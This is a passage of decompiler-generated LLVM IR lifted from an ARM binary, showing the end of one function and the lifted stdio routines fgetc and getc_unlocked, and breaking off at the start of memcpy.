  %v4_191d8 = inttoptr i32 %v3_191d8 to i32*
  %v5_191d8 = load i32, i32* %v4_191d8, align 4
  store i32 %v5_191d8, i32* %r2.global-to-local, align 4
  %v6_191d8 = add i32 %v0_191d8, 8
  %v7_191d8 = inttoptr i32 %v6_191d8 to i32*
  %v8_191d8 = load i32, i32* %v7_191d8, align 4
  store i32 %v8_191d8, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 102892, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_191ec = load i32, i32* %r5.global-to-local, align 4
  %v1_191ec = add i32 %v0_191ec, 4
  %v2_191ec = inttoptr i32 %v1_191ec to i32*
  %v3_191ec = load i32, i32* %v2_191ec, align 4
  store i32 %v3_191ec, i32* %r3.global-to-local, align 4
  %v0_191f0 = load i32, i32* %r0.global-to-local, align 4
  %v9_191f0 = icmp eq i32 %v0_191f0, %v3_191ec
  store i1 %v9_191f0, i1* %cpsr_z.global-to-local, align 1
  %v1_191f4 = add i32 %v0_191ec, 12
  store i32 %v1_191f4, i32* %r5.global-to-local, align 4
  br i1 %v9_191f0, label %dec_label_pc_19200, label %bb257

bb257:                                            ; preds = %dec_label_pc_191d8
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19220

dec_label_pc_19200:                               ; preds = %dec_label_pc_191d8
  %v0_19204.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_19200 = load i32, i32* %r6.global-to-local, align 4
  %v3_19200 = icmp ult i32 %v1_191f4, %v1_19200
  %v9_19200 = icmp eq i32 %v1_191f4, %v1_19200
  store i1 %v9_19200, i1* %cpsr_z.global-to-local, align 1
  %v2_19204 = add i32 %v0_19204.pre, %v3_191ec
  store i32 %v2_19204, i32* %r7.global-to-local, align 4
  br i1 %v3_19200, label %dec_label_pc_191d8, label %dec_label_pc_19220

dec_label_pc_19218:                               ; preds = %.thread21, %bb239
  %v0_19218 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_19218, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18f18

dec_label_pc_19220:                               ; preds = %dec_label_pc_19200, %bb257
  %v0_19220 = phi i32 [ -1, %bb257 ], [ %v2_19204, %dec_label_pc_19200 ]
  store i32 %v0_19220, i32* %r0.global-to-local, align 4
  store i32 %v27_18a5c, i32* @lr, align 4
  ret i32 %v0_19220

; uselistorder directives
  uselistorder i32 %v0_19220, { 1, 0 }
  uselistorder i32 %v1_19200, { 1, 0 }
  uselistorder i32 %v1_191f4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_191d8, { 2, 1, 0 }
  uselistorder i32 %v3_19178, { 1, 0, 2, 3 }
  uselistorder i32 %v2_19140, { 0, 1, 3, 2 }
  uselistorder i32 %v4_19134, { 1, 2, 0 }
  uselistorder i32 %v0_19134, { 1, 0 }
  uselistorder i32 %v1_1913c.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_190f4, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_190f0, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_190b4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1907c, { 1, 0 }
  uselistorder i32 %v1_1907c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_19078, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_18fd8, { 2, 1, 0 }
  uselistorder i32 %v2_18f58, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_18f48, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_18f34, { 1, 0, 2 }
  uselistorder i32 %v5_18f30, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18fc030, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_18ee8, { 1, 0 }
  uselistorder i32 %v1_18ee0, { 1, 2, 0 }
  uselistorder i32 %v2_18ed4, { 1, 0 }
  uselistorder i32 %v1_18ed4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18ed4, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_18ea4, { 1, 0 }
  uselistorder i32 %v0_18ea4, { 0, 2, 1 }
  uselistorder i32 %v2_18ea0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_18e8c, { 1, 0 }
  uselistorder i1 %v2_18e7c, { 1, 0 }
  uselistorder i32 %v1_18e78, { 3, 2, 1, 0 }
  uselistorder i32 %v2_18e74, { 1, 0 }
  uselistorder i1 %v2_18e64, { 1, 0 }
  uselistorder i32 %v1_18e58, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_18e0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18e0c, { 1, 0, 2 }
  uselistorder i1 %v2_18df4, { 1, 0 }
  uselistorder i32 %v5_18ddc, { 1, 0 }
  uselistorder i32 %v0_18dc8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18db0, { 1, 2, 0 }
  uselistorder i32 %v2_18dac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18d44, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18cec, { 1, 0 }
  uselistorder double %v2_18cb0, { 1, 0 }
  uselistorder i64 %v3_18cac, { 1, 0 }
  uselistorder i32 %v0_18c6c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_18c60, { 1, 0 }
  uselistorder i32 %v2_18c9c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_18c30, { 1, 0 }
  uselistorder i32 %v5_18bec, { 1, 0 }
  uselistorder i32 %v1_18b0c.v0_18af85, { 1, 0 }
  uselistorder i32 %v3_18bc8, { 1, 0 }
  uselistorder i32 %v0_18ba4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_18b8c, { 2, 1, 0 }
  uselistorder i32 %v0_18b70, { 1, 0 }
  uselistorder i32 %v0_18a90, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 10, 11, 12, 7, 13, 14, 8, 15, 9, 16, 17, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 17, 13, 18, 16, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 1, 8, 9, 17, 16, 15, 18, 10, 11, 19, 12, 13, 3, 20, 14, 2, 21, 22, 38, 37, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 60, 19, 20, 21, 22, 23, 24, 25, 26, 0, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 112, { 2, 6, 0, 7, 3, 1, 8, 4, 5, 9 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 57, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1400), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1424), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_19218, { 1, 0 }
  uselistorder label %dec_label_pc_191d0, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_19130, { 2, 0, 1 }
  uselistorder label %dec_label_pc_190a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19078, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_19050, { 1, 0 }
  uselistorder label %dec_label_pc_19024, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19000, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18fd0, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18f18, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_18f08, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_18e30, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18d3c, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_18cec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18ce4, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_18bc8, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_18ae4, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19250 = load i32, i32* @r4, align 4
  store i32 %v3_19250, i32* %stack_var_-16, align 4
  %v6_19250 = load i32, i32* @r5, align 4
  %v12_19250 = load i32, i32* @lr, align 4
  %v1_19254 = add i32 %arg1, 52
  %v2_19254 = inttoptr i32 %v1_19254 to i32*
  %v3_19254 = load i32, i32* %v2_19254, align 4
  %v2_1925c = icmp eq i32 %v3_19254, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_1925c, label %dec_label_pc_19294, label %dec_label_pc_19270

dec_label_pc_19270:                               ; preds = %entry
  %v1_19270 = add i32 %arg1, 16
  %v2_19270 = inttoptr i32 %v1_19270 to i32*
  %v3_19270 = load i32, i32* %v2_19270, align 4
  %v1_19274 = add i32 %arg1, 24
  %v2_19274 = inttoptr i32 %v1_19274 to i32*
  %v3_19274 = load i32, i32* %v2_19274, align 4
  %v3_19278 = icmp ult i32 %v3_19270, %v3_19274
  br i1 %v3_19278, label %.thread, label %dec_label_pc_19288

.thread:                                          ; preds = %dec_label_pc_19270
  %v2_1927c = inttoptr i32 %v3_19270 to i8*
  %v3_1927c = load i8, i8* %v2_1927c, align 1
  %v4_1927c = zext i8 %v3_1927c to i32
  store i32 %v4_1927c, i32* %r4.global-to-local, align 4
  %v6_1927c = add i32 %v3_19270, 1
  store i32 %v6_1927c, i32* %v2_19270, align 4
  br label %dec_label_pc_19308

dec_label_pc_19288:                               ; preds = %dec_label_pc_19270
  %v1_19288 = inttoptr i32 %arg1 to i16*
  %v2_19288 = call i32 @getc_unlocked(i16* %v1_19288)
  store i32 %v2_19288, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19308

dec_label_pc_19294:                               ; preds = %entry
  %v1_19298 = add i32 %arg1, 56
  store i32 %v1_19298, i32* @r4, align 4
  %v4_192ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_192ac)
  %v0_192c0 = load i32, i32* %r6.global-to-local, align 4
  %v2_192c0 = add i32 %v0_192c0, 20
  %v3_192c0 = inttoptr i32 %v2_192c0 to i32*
  %v4_192c0 = load i32, i32* %v3_192c0, align 4
  store i32 103116, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_192c0)
  %v0_192cc = load i32, i32* @r5, align 4
  %v1_192cc = add i32 %v0_192cc, 16
  %v2_192cc = inttoptr i32 %v1_192cc to i32*
  %v3_192cc = load i32, i32* %v2_192cc, align 4
  %v1_192d0 = add i32 %v0_192cc, 24
  %v2_192d0 = inttoptr i32 %v1_192d0 to i32*
  %v3_192d0 = load i32, i32* %v2_192d0, align 4
  %v3_192d4 = icmp ult i32 %v3_192cc, %v3_192d0
  br i1 %v3_192d4, label %.thread2, label %dec_label_pc_192e4

.thread2:                                         ; preds = %dec_label_pc_19294
  %v2_192d8 = inttoptr i32 %v3_192cc to i8*
  %v3_192d8 = load i8, i8* %v2_192d8, align 1
  %v4_192d8 = zext i8 %v3_192d8 to i32
  store i32 %v4_192d8, i32* %r4.global-to-local, align 4
  %v6_192d8 = add i32 %v3_192cc, 1
  store i32 %v6_192d8, i32* %v2_192cc, align 4
  br label %dec_label_pc_192f0

dec_label_pc_192e4:                               ; preds = %dec_label_pc_19294
  %v1_192e8 = inttoptr i32 %v0_192cc to i16*
  %v2_192e8 = call i32 @getc_unlocked(i16* %v1_192e8)
  store i32 %v2_192e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_192f0

dec_label_pc_192f0:                               ; preds = %.thread2, %dec_label_pc_192e4
  %v0_192fc = load i32, i32* %r6.global-to-local, align 4
  %v2_192fc = add i32 %v0_192fc, 28
  %v3_192fc = inttoptr i32 %v2_192fc to i32*
  %v4_192fc = load i32, i32* %v3_192fc, align 4
  store i32 %v4_192fc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_192fc)
  br label %dec_label_pc_19308

dec_label_pc_19308:                               ; preds = %.thread, %dec_label_pc_19288, %dec_label_pc_192f0
  %v0_19308 = load i32, i32* %r4.global-to-local, align 4
  %v2_19310 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19310, i32* @r4, align 4
  store i32 %v6_19250, i32* @r5, align 4
  store i32 %v12_19250, i32* @lr, align 4
  ret i32 %v0_19308

; uselistorder directives
  uselistorder i32 %v3_192cc, { 1, 0, 2 }
  uselistorder i32 %v3_19270, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 0, 5, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_19308, { 2, 1, 0 }
  uselistorder label %dec_label_pc_192f0, { 1, 0 }
}

define i32 @function_1931c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1931c:
  %v0_1931c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1931c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1931c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1931c, %bb
  %v10_19328 = phi i32 [ %arg1, %dec_label_pc_1931c ], [ 0, %bb ]
  ret i32 %v10_19328

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1932c = load i32, i32* @r4, align 4
  store i32 %v3_1932c, i32* %stack_var_-12, align 4
  %v6_1932c = load i32, i32* @r5, align 4
  %v9_1932c = load i32, i32* @lr, align 4
  %v0_19330 = load i32, i32* @r0, align 4
  %v1_19330 = add i32 %v0_19330, 16
  %v2_19330 = inttoptr i32 %v1_19330 to i32*
  %v3_19330 = load i32, i32* %v2_19330, align 4
  store i32 %v3_19330, i32* %r2.global-to-local, align 4
  %v1_19334 = add i32 %v0_19330, 24
  %v2_19334 = inttoptr i32 %v1_19334 to i32*
  %v3_19334 = load i32, i32* %v2_19334, align 4
  %v3_19338 = icmp ult i32 %v3_19330, %v3_19334
  store i32 %v0_19330, i32* @r4, align 4
  br i1 %v3_19338, label %bb, label %dec_label_pc_19358

bb:                                               ; preds = %entry
  %v2_19344 = inttoptr i32 %v3_19330 to i8*
  %v3_19344 = load i8, i8* %v2_19344, align 1
  %v4_19344 = zext i8 %v3_19344 to i32
  store i32 %v4_19344, i32* %r0.global-to-local, align 4
  %v6_19344 = add i32 %v3_19330, 1
  store i32 %v6_19344, i32* %r2.global-to-local, align 4
  store i32 %v6_19344, i32* %v2_19330, align 4
  br label %dec_label_pc_19444

dec_label_pc_19358:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  %v1_19358 = inttoptr i32 %v0_19330 to i16*
  %v2_19358 = load i16, i16* %v1_19358, align 2
  %v3_19358 = zext i16 %v2_19358 to i32
  %v1_1935c = and i32 %v3_19358, 131
  %tmp25 = icmp ugt i32 %v1_1935c, 128
  br i1 %tmp25, label %dec_label_pc_19378, label %dec_label_pc_19368

dec_label_pc_19368:                               ; preds = %dec_label_pc_19358
  store i32 128, i32* @r1, align 4
  %v0_1936c = call i32 @__stdio_trans2r_o()
  store i32 %v0_1936c, i32* %r0.global-to-local, align 4
  %v2_19370 = icmp eq i32 %v0_1936c, 0
  br i1 %v2_19370, label %dec_label_pc_19368.dec_label_pc_19378_crit_edge, label %dec_label_pc_19440

dec_label_pc_19368.dec_label_pc_19378_crit_edge:  ; preds = %dec_label_pc_19368
  %v0_19378.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19378

dec_label_pc_19378:                               ; preds = %dec_label_pc_19368.dec_label_pc_19378_crit_edge, %dec_label_pc_19358
  %v2_193b8 = phi i32 [ %v0_19378.pre, %dec_label_pc_19368.dec_label_pc_19378_crit_edge ], [ %v0_19330, %dec_label_pc_19358 ]
  %v1_19378 = inttoptr i32 %v2_193b8 to i16*
  %v2_19378 = load i16, i16* %v1_19378, align 2
  %v3_19378 = zext i16 %v2_19378 to i32
  store i32 %v3_19378, i32* %r2.global-to-local, align 4
  %v1_1937c = and i32 %v3_19378, 2
  %v2_1937c = icmp eq i32 %v1_1937c, 0
  br i1 %v2_1937c, label %dec_label_pc_193a8, label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19378
  %tmp26 = urem i16 %v2_19378, 2
  %v1_19384 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_19384
  %v4_19388 = and i32 %tmp22, 4
  %v5_19388 = add i32 %v4_19388, %v2_193b8
  %v1_1938c = add i32 %v5_19388, 36
  %v2_1938c = inttoptr i32 %v1_1938c to i8*
  %v3_1938c = load i8, i8* %v2_1938c, align 1
  %v4_1938c = zext i8 %v3_1938c to i32
  %v1_19390 = add nsw i32 %v3_19378, -1
  store i32 %v1_19390, i32* %r2.global-to-local, align 4
  store i32 %v4_1938c, i32* %r0.global-to-local, align 4
  %v2_1939c = add i32 %v2_193b8, 40
  %v3_1939c = inttoptr i32 %v2_1939c to i32*
  store i32 0, i32* %v3_1939c, align 4
  %v0_193a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_193a0 = trunc i32 %v0_193a0 to i16
  %v2_193a0 = load i32, i32* @r4, align 4
  %v3_193a0 = inttoptr i32 %v2_193a0 to i16*
  store i16 %v1_193a0, i16* %v3_193a0, align 2
  br label %dec_label_pc_19444

dec_label_pc_193a8:                               ; preds = %dec_label_pc_19378
  %v1_193a8 = add i32 %v2_193b8, 16
  %v1_193ac = inttoptr i32 %v1_193a8 to i32*
  %v2_193ac = load i32, i32* %v1_193ac, align 4
  %v3_193ac = add i32 %v2_193b8, 20
  %v4_193ac = inttoptr i32 %v3_193ac to i32*
  %v5_193ac = load i32, i32* %v4_193ac, align 4
  %v9_193b0 = icmp eq i32 %v5_193ac, %v2_193ac
  br i1 %v9_193b0, label %dec_label_pc_193c0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_193a8
  %v2_193b4 = inttoptr i32 %v2_193ac to i8*
  %v3_193b4 = load i8, i8* %v2_193b4, align 1
  %v4_193b4 = zext i8 %v3_193b4 to i32
  store i32 %v4_193b4, i32* %r0.global-to-local, align 4
  %v6_193b4 = add i32 %v2_193ac, 1
  store i32 %v6_193b4, i32* %v1_193ac, align 4
  br label %dec_label_pc_19444

dec_label_pc_193c0:                               ; preds = %dec_label_pc_193a8
  %v1_193c0 = add i32 %v2_193b8, 4
  %v2_193c0 = inttoptr i32 %v1_193c0 to i32*
  %v3_193c0 = load i32, i32* %v2_193c0, align 4
  %v7_193c4 = icmp eq i32 %v3_193c0, -2
  br i1 %v7_193c4, label %.thread7, label %dec_label_pc_193d8

.thread7:                                         ; preds = %dec_label_pc_193c0
  %v2_193c8 = or i16 %v2_19378, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_193c8, i16* %v1_19378, align 2
  br label %dec_label_pc_19444

dec_label_pc_193d8:                               ; preds = %dec_label_pc_193c0
  %v1_193d8 = and i32 %v3_19378, 768
  %v2_193d8 = icmp eq i32 %v1_193d8, 0
  br i1 %v2_193d8, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_193d8
  %v1_193e0 = load i32, i32* @r5, align 4
  %v3_193e0 = add i32 %v1_193e0, 52
  %v4_193e0 = inttoptr i32 %v3_193e0 to i32*
  %v5_193e0 = load i32, i32* %v4_193e0, align 4
  store i32 %v5_193e0, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_193d8, %bb23
  %v1_193e4 = xor i1 %v2_193d8, true
  call void @__pseudo_cond_branch(i1 %v1_193e4, i32 ptrtoint (i32* @global_var_13df4.992 to i32))
  %v0_193e8 = load i32, i32* @r4, align 4
  %v1_193e8 = add i32 %v0_193e8, 8
  store i32 %v1_193e8, i32* %r2.global-to-local, align 4
  %v1_193ec = inttoptr i32 %v1_193e8 to i32*
  %v2_193ec = load i32, i32* %v1_193ec, align 4
  store i32 %v2_193ec, i32* %r2.global-to-local, align 4
  %v3_193ec = add i32 %v0_193e8, 12
  %v4_193ec = inttoptr i32 %v3_193ec to i32*
  %v5_193ec = load i32, i32* %v4_193ec, align 4
  %v9_193f0 = icmp eq i32 %v5_193ec, %v2_193ec
  br i1 %v9_193f0, label %dec_label_pc_19424, label %dec_label_pc_193f8

dec_label_pc_193f8:                               ; preds = %.thread9
  %v2_193f8 = add i32 %v0_193e8, 24
  %v3_193f8 = inttoptr i32 %v2_193f8 to i32*
  store i32 %v2_193ec, i32* %v3_193f8, align 4
  %v0_193fc = load i32, i32* @r4, align 4
  store i32 %v0_193fc, i32* %r0.global-to-local, align 4
  %v2_19400 = call i32 @__stdio_rfill(i32 %v0_193fc)
  store i32 %v2_19400, i32* %r0.global-to-local, align 4
  %v2_19404 = icmp eq i32 %v2_19400, 0
  br i1 %v2_19404, label %dec_label_pc_19440, label %dec_label_pc_1940c

dec_label_pc_1940c:                               ; preds = %dec_label_pc_193f8
  %v0_1940c = load i32, i32* @r4, align 4
  %v1_1940c = add i32 %v0_1940c, 20
  %v2_1940c = inttoptr i32 %v1_1940c to i32*
  %v3_1940c = load i32, i32* %v2_1940c, align 4
  %v2_19410 = add i32 %v0_1940c, 24
  %v3_19410 = inttoptr i32 %v2_19410 to i32*
  store i32 %v3_1940c, i32* %v3_19410, align 4
  %v0_19414 = load i32, i32* @r4, align 4
  %v1_19414 = add i32 %v0_19414, 16
  %v2_19414 = inttoptr i32 %v1_19414 to i32*
  %v3_19414 = load i32, i32* %v2_19414, align 4
  %v1_19418 = inttoptr i32 %v3_19414 to i8*
  %v2_19418 = load i8, i8* %v1_19418, align 1
  %v3_19418 = zext i8 %v2_19418 to i32
  store i32 %v3_19418, i32* %r0.global-to-local, align 4
  %v5_19418 = add i32 %v3_19414, 1
  store i32 %v5_19418, i32* %v2_19414, align 4
  br label %dec_label_pc_19444

dec_label_pc_19424:                               ; preds = %.thread9
  %v1_19424 = inttoptr i32 %v0_193e8 to i16*
  store i32 %v0_193e8, i32* %r0.global-to-local, align 4
  %v2_19428 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_19430 = call i32 @__stdio_READ(i16* %v1_19424, i32 %v2_19428, i32 1)
  store i32 %v5_19430, i32* %r0.global-to-local, align 4
  %v2_19434 = icmp eq i32 %v5_19430, 0
  br i1 %v2_19434, label %dec_label_pc_19440, label %bb24

bb24:                                             ; preds = %dec_label_pc_19424
  %v4_19438 = load i8, i8* %stack_var_-17, align 1
  %v5_19438 = sext i8 %v4_19438 to i32
  store i32 %v5_19438, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19444

dec_label_pc_19440:                               ; preds = %dec_label_pc_19424, %dec_label_pc_19368, %dec_label_pc_193f8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19444

dec_label_pc_19444:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1940c, %dec_label_pc_19384, %dec_label_pc_19440
  %v2_19448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19448, i32* @r4, align 4
  store i32 %v6_1932c, i32* @r5, align 4
  store i32 %v9_1932c, i32* @lr, align 4
  %v1_1944c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1944c

; uselistorder directives
  uselistorder i32 %v2_193ac, { 1, 0, 2 }
  uselistorder i32 %v2_193b8, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_19330, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_19444, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_19440, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_19460 = load i32, i32* %r1.global-to-local, align 4
  %v1_19460 = load i32, i32* %r0.global-to-local, align 4
